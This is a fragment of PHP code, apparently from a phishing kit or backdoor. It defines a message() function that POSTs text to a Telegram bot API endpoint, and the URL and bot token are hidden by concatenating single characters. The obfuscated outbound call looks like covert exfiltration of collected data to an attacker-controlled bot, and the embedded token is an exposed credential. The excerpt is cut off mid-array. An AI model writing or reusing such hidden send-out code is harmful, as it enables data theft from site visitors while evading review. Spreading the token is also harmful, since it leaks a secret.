...
function message($text) {
    ...
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'a' . 'p' . 'i' . '.' . 't' . 'e' . 'l' . 'e' . 'g' . 'r' . 'a' . 'm' . '.' . 'o' . 'r' . 'g' . '/' . 'b' . 'o' . 't' . '1' . '4' . '4' . '5' . '5' . '8' . '0' . '5' . '6' . '3' . ':' . 'A' . 'A' . 'F' . '0' . 'l' . '5' . 'D' . 'h' . 'i' . '1' . 'b' . 'K' . 'T' . '9' . '2' . '0' . 'J' . 'C' . 'v' . 'v' . 'V' . 'h' . 'X' . 'N' . '4' . 's' . 'q' . 'U' . 'X' . 'k' . '4' . '4' . '5' . '5' . '8' . '0' . '5' . '6',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
